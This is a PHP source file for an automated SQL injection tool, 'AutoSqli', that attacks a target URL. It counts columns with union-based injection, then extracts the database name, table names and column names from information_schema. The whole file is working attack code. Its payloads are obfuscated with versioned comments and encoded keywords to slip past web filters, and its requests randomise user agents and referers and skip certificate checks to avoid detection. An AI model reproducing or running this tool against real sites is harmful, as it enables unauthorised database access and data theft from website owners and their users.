<?php

use Spatie\Regex\Regex;
use JMathai\PhpMultiCurl\MultiCurl;

require "autoload.php";
error_reporting(0);

class AutoSqli
{
    public static $url                 = "";
    public static $url_injection       = "";
    public static $database            = "";
    public static $table               = "";
    public static $columns             = array();
    public static $url_payload_ncolum  = "";

    public static $getColPayload       = "/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/";
    public static $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
    public static $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
    public static $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
    public static $number_colum        = 0;
    public static $vulncolum           = 0;
    public static $maxColumns          = 100;

    private static function getContent($url, $code = "")
    {
        $mc = MultiCurl::getInstance();

        $header = array(
            'Connection: keep-alive',
            'Keep-Alive: ' . rand(110, 120),
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Upgrade-Insecure-Requests: 1',
            'Accept-Encoding: gzip, deflate, sdch',
            'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4',
            'Cache-Control: no-cache',
            'Pragma: no-cache',
        );

        $array_curl = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_SSL_VERIFYHOST => FALSE,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_USERAGENT => UAgent::random(),
            CURLOPT_REFERER => Referer::random(),
            CURLOPT_HTTPHEADER => $header
        );

        if (!$ch = curl_init());
        curl_setopt_array($ch, $array_curl);

        $call = $mc->addCurl($ch);

        if ($code != "") {
            return $call->code;
        } else {
            return $call->response;
        }
    }

    private static function strchar($string)
    {
        $char = "";
        $pisah = str_split($string);
        foreach ($pisah as $value) {
            $char .= ord($value) . ", ";
        }

        $char = str_replace(' ', '', $char);
        return rtrim($char, ",");
    }

    private static function strhex($string)
    {
        $hexstr = unpack('H*', $string);
        return array_shift($hexstr);
    }

    private static function getConcat($string)
    {
        return "/*!50000Concat(0x" . self::strhex('<concat>') . ",/*!50000gROup_cONcat(" . $string . ")*/,0x" . self::strhex('</concat>') . ")";
    }


    public static function setUrl($url)
    {
        $code = self::getContent($url, "yes");

        if ($code != 200) die("you are not connected to the internet or you internet slowy or website down \n");
        self::$url = $url;
    }

    public static function getUrl()
    {
        return self::$url . rand(10, 100);
    }

    public static function setNumColumns()
    {
        echo "[!] Start Count Columns...\n";
        self::$url_injection = self::$url . "-" . rand(10, 100);
        $tampung_angka = "";

        for ($i = 1; $i <= self::$maxColumns; $i++) {
            $tampung_angka .= self::$getColPayload . ",";

            $full_url = self::$url_injection . self::$UnionPayload . rtrim($tampung_angka, ",") . "+--+-";
            $full_url1 = self::$url_injection . "'" . self::$UnionPayload . rtrim($tampung_angka, ",") . "+--+-";

            $content = self::getContent($full_url);
            $content1 = self::getContent($full_url1);

            if (Regex::match('/sqli indosec/', $content)->hasMatch()) {
                echo "[+] Columns Total: $i \n";
                self::$number_colum = $i;
                self::$url_payload_ncolum = $full_url;
                break;
            }

            if (Regex::match('/sqli indosec/', $content1)->hasMatch()) {
                echo "[+] Columns Total: $i \n";
                self::$number_colum = $i;
                self::$url_payload_ncolum = $full_url1;
                break;
            }
        }
    }

    public static function getUrlPayload()
    {
        return self::$url_payload_ncolum;
    }

    public static function setDatabase()
    {
        $getDatabase = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', "/*!50000%43o%4Ec%41t/**12345**/(" . self::$startSQLi . ",/*!12345%44a%54a%42a%53e*/()," . self::$endSQLi . ")", self::$url_payload_ncolum);
        $content = self::getContent($getDatabase);
        self::$database = Regex::match('/<sqli-helper>(.*?)<\/sqli-helper>/', $content)->result();
    }

    public static function getDatabase()
    {
        self::$database = str_replace('<sqli-helper>', '', self::$database);
        self::$database = str_replace('</sqli-helper>', '', self::$database);

        return self::$database;
    }

    public static function setTable()
    {
        $getTable = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', self::getConcat("table_name"), self::$url_payload_ncolum);
        $getTable = str_replace("+--+-", "+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()+--+-", $getTable);
        $content = self::getContent($getTable);
        self::$table = Regex::match('/<concat>(.*?)<\/concat>/', $content)->result();
    }

    public static function getTable()
    {
        self::$table = str_replace('<concat>', '', self::$table);
        self::$table = str_replace('</concat>', '', self::$table);

        return self::$table;
    }

    public static function setColumns()
    {
        $tables = explode(",", self::$table);
        $columns_data = [];

        foreach ($tables as $value) {
            $getColumns = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', self::getConcat("column_name"), self::$url_payload_ncolum);
            $getColumns = str_replace("+--+-", "+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(" . self::strchar($value) . ")+--+-", $getColumns);

            $content = self::getContent($getColumns);

            array_push($columns_data, (object) [
                $value => Regex::match('/<concat>(.*?)<\/concat>/', $content)->result()
            ]);
        }

        self::$columns = $columns_data;
    }

    public static function getColumns()
    {
        foreach (self::$columns as $key => $value) {
            foreach ($value as $key1 => $value1) {
                $value1 = str_replace('<concat>', '', $value1);
                $value1 = str_replace('</concat>', '', $value1);
                echo "Table $key1 => " . $value1 . "\n";
            }
        }
    }
}
